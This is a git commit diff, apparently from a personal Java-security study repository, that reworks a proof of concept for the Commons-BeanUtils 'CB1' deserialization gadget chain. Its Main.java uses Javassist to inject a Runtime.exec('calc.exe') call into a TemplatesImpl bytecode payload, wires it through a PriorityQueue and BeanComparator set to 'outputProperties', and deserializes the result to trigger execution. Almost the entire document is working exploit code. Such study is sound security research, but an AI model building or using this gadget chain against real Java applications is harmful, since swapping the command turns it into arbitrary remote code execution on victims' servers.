34d2be2ed40aeb6a501e313760c665e9d78ef81e
FFreestanding <381517195@qq.com>
2023-02-05 16:18:25 +0800

    new CB1

--- CB1/src/Main.java
+++ CB1/src/Main.java
@@ -1,31 +1,38 @@
 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import javassist.ClassPool;
+import javassist.CtClass;
 import org.apache.commons.beanutils.BeanComparator;
 import java.lang.reflect.Field;
-import java.nio.file.Files;
-import java.nio.file.Paths;
 import java.util.PriorityQueue;
 
 public class Main {
     public static void main(String[] args) throws Exception {
-        byte[] code = Files.readAllBytes(Paths.get("D:\\CTFmain\\学习研究\\JAVA安全\\JavaUnserializeChain\\CB1\\target\\classes\\TemplatesBytes.class"));
-        TemplatesImpl templates = new TemplatesImpl();
-        setFieldValue(templates, "_name", "Calc");
-        setFieldValue(templates, "_bytecodes", new byte[][] {code});
-        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
-        //    templates.newTransformer();
-        final BeanComparator beanComparator = new BeanComparator();
-        // 创建新的队列，并添加恶意字节码
-        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, beanComparator);
+        TemplatesImpl obj = new TemplatesImpl();
+        setFieldValue(obj, "_bytecodes", new byte[][]{makeByteCode()});
+        setFieldValue(obj, "_name", "HelloTemplatesImpl");
+        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
+        final BeanComparator comparator = new BeanComparator();
+        PriorityQueue queue = new PriorityQueue(2, comparator);
+
         queue.add(1);
         queue.add(1);
+        setFieldValue(comparator, "property", "outputProperties");
+        setFieldValue(queue, "queue", new Object[]{obj, obj});
 
-        // 将 property 的值赋为 outputProperties setFieldValue(beanComparator, "property", "outputProperties");
-        setFieldValue(queue, "queue", new Object[]{templates, templates});
-
-        FileStream.writeSer(queue,"CB1.ser");
+//        FileStream.writeSer(queue,"CB1.ser");
         FileStream.readSer("CB1.ser");
+
     }
+    public static byte[] makeByteCode() throws Exception{
+        ClassPool pool = ClassPool.getDefault();
+        CtClass ctClass = pool.get(MyTemplate.class.getName());
+        String cmd = "Runtime.getRuntime().exec(\"calc.exe\");";
+        ctClass.makeClassInitializer().insertBefore(cmd);
+        ctClass.setName("NormalClass");
+        return ctClass.toBytecode();
+    }
+
     public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception{
         Field field = obj.getClass().getDeclaredField(fieldName);
         field.setAccessible(true);
